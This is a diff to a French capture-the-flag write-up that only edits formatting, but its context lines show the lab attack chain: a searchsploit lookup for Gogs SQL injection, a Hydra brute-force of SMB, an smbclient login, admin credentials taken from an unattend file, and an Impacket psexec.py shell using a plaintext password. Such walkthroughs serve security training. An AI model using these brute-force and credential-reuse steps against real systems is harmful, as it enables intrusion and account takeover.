@@ -94,7 +94,7 @@ Toutefois la curiosité ma porté naturellement sur le port 3000 qui fait tourne
 
 Cette application est connue pour être vulnérable à deux failles d'injection SQL :  
 
-```bash
+```console
 $ searchsploit gogs
 -------------------------------------------- ----------------------------------------
  Exploit Title                              |  Path
@@ -164,7 +164,7 @@ for word, num in product(words, end):
 
 On balance ensuite tout ça à Hydra sur le port SMB :  
 
-```bash
+```console
 $ hydra -l russel -P words.txt smb://10.1.1.15
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -182,7 +182,7 @@ Gamma
 
 On a alors accès au disque :  
 
-```bash
+```console
 $ smbclient -I 10.1.1.15 -U russel -L BETA
 Enter WORKGROUP\russel's password: 
 
@@ -206,7 +206,7 @@ Cet accès est suffisant pour obtenir le flag de l'utilisateur (436bf1fd7f32f885
 
 Mais... wait... que vois-je à la racine du shell ? Est-ce un oiseau? Est-ce un avion ? Mieux que ça c'est un fichier *unattend* :)  
 
-```bash
+```console
 smb: \> dir
   $Recycle.Bin                      DHS        0  Sun Sep 23 15:56:37 2018
   autoexec.bat                        A       24  Wed Jun 10 23:42:20 2009
@@ -240,11 +240,11 @@ On trouve effectivement des identifiants dans le fichier :
 </Credentials>
 ```
 
-Si ça c'est pas mignon :p Les identifiants admin permettent de récupérer le flag final (f1f95d42573c2f3940bfae6fdba05e5a). That's it !  
+Si ça, c'est pas mignon :p Les identifiants admin permettent de récupérer le flag final (f1f95d42573c2f3940bfae6fdba05e5a). That's it !  
 
 On peut aussi obtenir un shell via le script psexec.py de Impacket par exemple :  
 
-```bash
+```console
 $ PYTHONPATH=. python2 examples/psexec.py 'BETA/Administrator:loveLyp4ssw0rd*!@10.1.1.15'
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
